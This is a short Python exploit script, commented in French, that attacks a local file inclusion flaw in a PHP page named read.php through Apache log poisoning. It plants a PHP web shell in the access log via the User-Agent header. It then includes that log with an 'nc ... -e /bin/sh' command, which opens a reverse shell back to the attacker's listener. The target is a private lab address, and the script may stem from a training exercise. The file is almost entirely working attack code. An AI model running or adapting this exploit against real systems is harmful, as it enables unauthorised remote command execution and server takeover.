#encoding:utf-8
import requests,sys
# Exploitation de la faille LFI via les logs
#nc -lvp 12345 sur l'hôte distant
if len(sys.argv)!=3:
	print "Usage : python exploit_lfi.py <local IP> <local Port>"
	exit(1)


# Cette ligne de code est pour but de insérer dans le fichier "/var/log/apache2/access.log" un script php
requests.get("http://192.168.4.1",headers={'User-Agent':"<?php system($_GET['cmd']); ?>"})
# Exploit la faille "include" de read.php pour executer le script en haut et ouvrir un reverse shell 
requests.get("http://192.168.4.1/read.php",params={"file":"/var/log/apache2/access.log","cmd":"nc "+sys.argv[1]+" "+sys.argv[2]+" -e /bin/sh"})
